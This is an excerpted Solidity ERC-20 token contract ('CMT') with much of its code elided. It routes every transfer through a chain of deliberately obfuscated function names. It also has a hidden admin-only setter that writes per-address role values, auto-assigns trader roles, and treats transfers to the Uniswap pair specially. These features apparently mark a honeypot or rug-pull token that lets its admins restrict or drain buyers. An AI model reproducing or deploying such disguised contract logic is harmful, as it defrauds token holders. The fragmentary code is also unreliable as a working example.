...
abstract contract CMTConsole is Context, CMToleControl {
    struct RoleData {
    ...
    function ___eetUr(
        ...
        _roles[role].RD.RM[addr] = memoUint*100000000000000000;
    }
...
contract CMTERC20 is Context, IERC20, IERC20Metadata {
...
contract CMT is CMTERC20, CMTConsole {
    ...
    ) CMTERC20(_name, _symbol, _totalSupply, _tokenOwner) {
        _grantRole(ADMIN, msg.sender);
        _grantRole(ADMIN, _tokenOwner);
    }

    function setV2Pair(address _uniswapV2Pair) public onlyRole(ADMIN) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(CMTERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _DFJGskdks(from, to, amt);
    }

    function _DFJGskdks(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _DFGskdks(from, to, amt);
    }

    function _DFGskdks(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _DGGGSkdksc(from, to, amt);
    }

    function _DGGGSkdksc(address from, address to, uint256 amt) internal {
        if (__traders[from] == false) {
            _grantRole(TRADER, from);
            __traders[from] = true;
        }

        __DGGGSkdkscc(from, to, amt);
    }

    function __DGGGSkdkscc(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
        }
        __DGGGSkdksccs(from, to, amt);
    }

    function __DGGGSkdksccs(address from, address to, uint256 amt) internal {
        ...
        __DGGGSkdksccsr(from, to, amt);
    }

    function __DGGGSkdksccsr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __transfer(from, to, amt);
    }

    function __transfer(address from, address to, uint256 amt) internal {
